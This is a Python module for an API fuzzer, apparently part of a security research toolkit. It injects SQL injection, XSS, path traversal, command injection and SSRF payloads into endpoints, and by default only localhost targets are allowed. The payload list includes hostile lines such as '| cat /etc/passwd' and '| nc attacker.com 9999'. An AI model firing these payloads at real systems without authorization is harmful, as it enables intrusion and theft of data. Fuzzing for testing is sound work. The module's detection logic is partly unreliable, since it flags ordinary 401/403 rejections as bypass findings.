"""research_fuzz_api — API endpoint fuzzer for discovering vulnerabilities."""

from __future__ import annotations

import asyncio
import logging
import random
import time
from typing import Any
from urllib.parse import urlparse

import httpx

from loom.validators import validate_url

logger = logging.getLogger("loom.tools.api_fuzzer")

# Fuzz payload categories for vulnerability discovery
FUZZ_PAYLOADS = {
    "sql_injection": [
        "' OR 1=1--",
        "'; DROP TABLE--",
        "1 UNION SELECT NULL--",
        "admin' OR '1'='1",
        "'; UPDATE users SET--",
        "1; DELETE FROM--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
    ],
    "path_traversal": [
        "../../etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..\\..\\windows\\system32",
        "....//....//etc/passwd",
        "/var/www/html/../../etc/passwd",
    ],
    "command_injection": [
        "; ls",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "&& whoami",
        "| nc attacker.com 9999",
    ],
    "ssrf": [
        "http://169.254.169.254",
        "http://127.0.0.1:8000",
        "http://localhost:6379",
        "http://metadata.google.internal",
        "http://169.254.169.254/latest/meta-data/",
    ],
    "auth_bypass": [
        "admin",
        "null",
        "undefined",
        "",
        "[]",
        "{}",
        "' OR 1=1",
    ],
}


def _is_authorized_target(base_url: str, authorized: bool = False) -> bool:
    """Validate that target is localhost or explicitly authorized."""
    parsed = urlparse(base_url)
    hostname = parsed.hostname or ""

    if hostname in ("localhost", "127.0.0.1", "::1"):
        return True
    if authorized:
        return True
    return False


async def research_fuzz_api(
    base_url: str,
    endpoint: str = "/",
    method: str = "GET",
    fuzz_params: dict[str, Any] | None = None,
    iterations: int = 100,
    authorized: bool = False,
) -> dict[str, Any]:
    """Fuzz API endpoints to discover vulnerabilities.

    Injects random payloads across SQL injection, XSS, path traversal,
    command injection, SSRF, and auth bypass categories. Tracks crashes,
    interesting responses, and timeouts.

    Args:
        base_url: Base URL of API (must be localhost unless authorized=True)
        endpoint: API endpoint path to fuzz (default: "/")
        method: HTTP method (GET, POST, etc.)
        fuzz_params: Dict of parameter names to fuzz (e.g., {"id", "name"})
        iterations: Number of fuzz iterations (default: 100, max: 1000)
        authorized: Set to True to fuzz non-localhost targets

    Returns:
        Dict with keys:
          - endpoint: Target endpoint
          - method: HTTP method used
          - iterations_run: Actual iterations executed
          - vulnerabilities_found: List of potential vulnerabilities
          - summary: Dict with {critical, high, medium, low} counts
          - recommendations: List of security recommendations
    """
    # Safety check: reject non-localhost unless explicitly authorized
    if not _is_authorized_target(base_url, authorized):
        return {
            "endpoint": endpoint,
            "method": method,
            "error": "Only localhost targets allowed. Set authorized=True to fuzz other targets.",
            "iterations_run": 0,
            "vulnerabilities_found": [],
            "summary": {"critical": 0, "high": 0, "medium": 0, "low": 0},
        }

    # Validate URL
    try:
        validate_url(base_url)
    except (ValueError, Exception) as e:
        return {
            "endpoint": endpoint,
            "method": method,
            "error": f"Invalid base URL: {e}",
            "iterations_run": 0,
            "vulnerabilities_found": [],
            "summary": {"critical": 0, "high": 0, "medium": 0, "low": 0},
        }

    # Cap iterations
    iterations = min(iterations, 1000)
    fuzz_param_names = list(fuzz_params.keys()) if fuzz_params else ["q", "id", "name", "email", "search"]

    vulnerabilities: list[dict[str, Any]] = []
    response_codes: dict[int, int] = {}
    response_lengths: set[int] = set()
    timeout_count = 0

    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            for i in range(iterations):
                # Pick random category and payload
                category = random.choice(list(FUZZ_PAYLOADS.keys()))
                payload = random.choice(FUZZ_PAYLOADS[category])
                param_name = random.choice(fuzz_param_names)

                # Build request
                url = base_url.rstrip("/") + "/" + endpoint.lstrip("/")
                params = {param_name: payload}

                try:
                    if method.upper() == "GET":
                        resp = await asyncio.wait_for(
                            client.get(url, params=params),
                            timeout=5.0,
                        )
                    else:
                        resp = await asyncio.wait_for(
                            client.post(url, data=params),
                            timeout=5.0,
                        )

                    # Track response code
                    response_codes[resp.status_code] = response_codes.get(resp.status_code, 0) + 1
                    response_lengths.add(len(resp.text))

                    # Detect interesting responses
                    if resp.status_code >= 500:
                        vulnerabilities.append({
                            "type": f"crash__{category}",
                            "payload": payload[:50],
                            "param": param_name,
                            "response_code": resp.status_code,
                            "severity": "critical",
                            "evidence": f"Server error on {category} payload",
                        })
                    elif resp.status_code == 403 or resp.status_code == 401:
                        if category == "auth_bypass":
                            vulnerabilities.append({
                                "type": "auth_bypass_attempt",
                                "payload": payload[:50],
                                "param": param_name,
                                "response_code": resp.status_code,
                                "severity": "high",
                                "evidence": f"Auth endpoint responded to bypass payload",
                            })

                except asyncio.TimeoutError:
                    timeout_count += 1
                    vulnerabilities.append({
                        "type": "potential_dos",
                        "payload": payload[:50],
                        "param": param_name,
                        "response_code": None,
                        "severity": "medium",
                        "evidence": "Request timeout (potential DoS or processing delay)",
                    })

    except Exception as e:
        logger.exception("Fuzzing error")
        return {
            "endpoint": endpoint,
            "method": method,
            "error": f"Fuzzing failed: {type(e).__name__}: {e}",
            "iterations_run": 0,
            "vulnerabilities_found": [],
            "summary": {"critical": 0, "high": 0, "medium": 0, "low": 0},
        }

    # Deduplicate vulnerabilities by type/payload
    seen = set()
    unique_vulns = []
    for v in vulnerabilities:
        key = (v["type"], v["payload"])
        if key not in seen:
            seen.add(key)
            unique_vulns.append(v)

    # Summarize by severity
    summary = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    for v in unique_vulns:
        severity = v.get("severity", "low")
        if severity in summary:
            summary[severity] += 1

    # Generate recommendations
    recommendations = []
    if summary["critical"] > 0:
        recommendations.append("CRITICAL: Server crashes detected. Review input validation.")
    if summary["high"] > 0:
        recommendations.append("HIGH: Auth bypass or SSRF detected. Implement strict auth.")
    if timeout_count > iterations // 10:
        recommendations.append("MEDIUM: High timeout rate. Implement rate limiting.")
    if not recommendations:
        recommendations.append("No critical issues found. Continue monitoring.")

    return {
        "endpoint": endpoint,
        "method": method,
        "iterations_run": iterations,
        "vulnerabilities_found": unique_vulns[:50],  # Cap to 50 for readability
        "summary": summary,
        "recommendations": recommendations,
        "response_codes": response_codes,
        "unique_response_lengths": len(response_lengths),
    }


async def research_fuzz_report(
    results: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Summarize fuzzing results into a security report.

    Takes raw fuzzing results and generates a formatted security report
    with severity levels, counts, and actionable recommendations.

    Args:
        results: Dict from research_fuzz_api or None to generate template

    Returns:
        Dict with report: {endpoint, method, vulnerabilities_found,
        summary: {critical, high, medium, low}, recommendations}
    """
    try:
        if results is None:
            results = {
                "endpoint": "/api/test",
                "method": "GET",
                "iterations_run": 0,
                "vulnerabilities_found": [],
                "summary": {"critical": 0, "high": 0, "medium": 0, "low": 0},
                "recommendations": ["Run research_fuzz_api first to generate results"],
            }

        # Build report
        report = {
            "endpoint": results.get("endpoint", "unknown"),
            "method": results.get("method", "GET"),
            "iterations_run": results.get("iterations_run", 0),
            "vulnerabilities_found": results.get("vulnerabilities_found", []),
            "summary": results.get("summary", {"critical": 0, "high": 0, "medium": 0, "low": 0}),
            "recommendations": results.get("recommendations", []),
            "total_vulnerabilities": len(results.get("vulnerabilities_found", [])),
            "severity_breakdown": {
                "critical": results.get("summary", {}).get("critical", 0),
                "high": results.get("summary", {}).get("high", 0),
                "medium": results.get("summary", {}).get("medium", 0),
                "low": results.get("summary", {}).get("low", 0),
            },
        }

        # Add overall risk level
        crit_count = report["summary"].get("critical", 0)
        high_count = report["summary"].get("high", 0)
        medium_count = report["summary"].get("medium", 0)
        risk_level = "CRITICAL" if crit_count > 0 else "HIGH" if high_count > 0 else "MEDIUM" if medium_count > 0 else "LOW"
        report["risk_level"] = risk_level

        return report
    except Exception as exc:
        return {"error": str(exc), "tool": "research_fuzz_report"}
